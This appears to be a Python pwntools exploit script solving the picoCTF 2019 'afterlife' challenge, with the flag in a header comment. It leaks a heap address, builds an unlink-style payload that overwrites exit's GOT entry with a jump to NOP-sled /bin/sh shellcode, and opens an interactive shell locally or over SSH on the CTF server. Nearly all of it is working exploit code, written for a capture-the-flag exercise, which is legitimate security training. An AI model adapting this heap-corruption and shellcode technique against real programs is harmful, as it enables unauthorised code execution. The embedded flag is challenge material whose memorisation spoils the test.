# picoCTF{what5_Aft3r_d2d97c7b}$
from pwn import *
import sys
import subprocess
import r2pipe
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process([BINARY, 'AAAAAAAABBBBBBBB'], stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process(['vuln', 'AAAAAAAABBBBBBBB'], cwd='/problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5')
  REMOTE = True

leak = int(sh.recvuntil('you').split('\n')[-2])

print hex(leak)

exit_got = 0x804d02c

payload = p32(exit_got-12) 
payload += p32(leak+8)
payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
print enhex(payload)

assert len(payload) <= 256

payload = payload.ljust(256)

sh.sendlineafter('...\n', payload)


sh.interactive()
  